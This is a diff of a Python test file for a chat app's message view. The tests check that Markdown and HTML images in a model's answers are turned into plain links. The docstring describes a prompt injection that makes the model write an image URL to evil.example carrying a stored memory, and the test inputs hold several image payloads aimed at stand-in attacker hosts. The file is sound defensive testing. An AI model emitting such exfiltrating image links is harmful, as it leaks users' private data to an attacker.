@@ -4,10 +4,12 @@ The Markdown control loads an image as soon as it is drawn. A prompt injection
 could make the model write ![](https://evil.example/?d=<a memory>) - so in her
 answers images become links, and nothing that draws as an image is left.
 """
+
 from __future__ import annotations
 
 import random
 
+import flet as ft
 import pytest
 
 from views.chat_message import ChatMessage
@@ -26,14 +28,35 @@ def draws_no_image(text: str) -> bool:
     [
         ("![диаграма](https://e.x/a.png)", f"{LINK}диаграма](https://e.x/a.png)"),
         ("виж ![](https://e.x/?d=1) тук", f"виж {LINK}](https://e.x/?d=1) тук"),
-        ('![a](https://e.x/a.png "заглавие")', f'{LINK}a](https://e.x/a.png "заглавие")'),
+        (
+            '![a](https://e.x/a.png "заглавие")',
+            f'{LINK}a](https://e.x/a.png "заглавие")',
+        ),
         ("![a][1]\n\n[1]: https://e.x/a.png", f"{LINK}a][1]\n\n[1]: https://e.x/a.png"),
-        ("![data](data:image/png;base64,AAAA)", f"{LINK}data](data:image/png;base64,AAAA)"),
-        ('<img src="https://e.x/a.png" alt="лого">', f"{WORD_JOINER}[{IMAGE_MARK} лого](https://e.x/a.png)"),
-        ("<IMG SRC=https://e.x/a.png>", f"{WORD_JOINER}[{IMAGE_MARK}](https://e.x/a.png)"),
+        (
+            "![data](data:image/png;base64,AAAA)",
+            f"{LINK}data](data:image/png;base64,AAAA)",
+        ),
+        (
+            '<img src="https://e.x/a.png" alt="лого">',
+            f"{WORD_JOINER}[{IMAGE_MARK} лого](https://e.x/a.png)",
+        ),
+        (
+            "<IMG SRC=https://e.x/a.png>",
+            f"{WORD_JOINER}[{IMAGE_MARK}](https://e.x/a.png)",
+        ),
         ("<img alt='без адрес'>", f"{IMAGE_MARK} без адрес"),
     ],
-    ids=["inline", "no-alt", "title", "reference", "data-uri", "img-tag", "img-tag-unquoted", "img-tag-no-src"],
+    ids=[
+        "inline",
+        "no-alt",
+        "title",
+        "reference",
+        "data-uri",
+        "img-tag",
+        "img-tag-unquoted",
+        "img-tag-no-src",
+    ],
 )
 def test_an_image_becomes_a_link(written, shown):
     assert disarm_images(written) == shown
@@ -111,8 +134,22 @@ def test_random_mixtures_never_leave_an_image():
     # The safety must not rest on telling code from prose right: whatever the
     # mixture of fences, backticks, escapes and tags, nothing is left to fetch.
     pieces = [
-        "![", "](https://evil/?d=1)", "[", "]", "!", "\\", "`", FENCE, "~~~", "\n",
-        "<img src=https://evil/x>", "<IMG", " src=", ">", "текст ", "[1]: https://evil\n",
+        "![",
+        "](https://evil/?d=1)",
+        "[",
+        "]",
+        "!",
+        "\\",
+        "`",
+        FENCE,
+        "~~~",
+        "\n",
+        "<img src=https://evil/x>",
+        "<IMG",
+        " src=",
+        ">",
+        "текст ",
+        "[1]: https://evil\n",
     ]
     rng = random.Random(20261108)
     for _ in range(3000):
@@ -144,13 +181,15 @@ def test_an_image_split_across_streamed_chunks_is_never_drawn():
 
 
 @pytest.mark.asyncio
-async def test_copy_gives_the_answer_as_it_was_written(mock_page):
+async def test_copy_gives_the_answer_as_it_was_written(mock_page, clipboard):
     written = "![x](https://e.x/a.png)"
     message = ChatMessage("assistant", written, page=mock_page)
 
     await message.copy_to_clipboard(None)
 
-    mock_page.set_clipboard.assert_called_once_with(written)
+    assert clipboard == [written]
+    # "Копирано" is said only after the text is really on the clipboard.
+    assert isinstance(mock_page.show_dialog.call_args.args[0], ft.SnackBar)
 
 
 def test_the_users_own_message_is_shown_as_written():
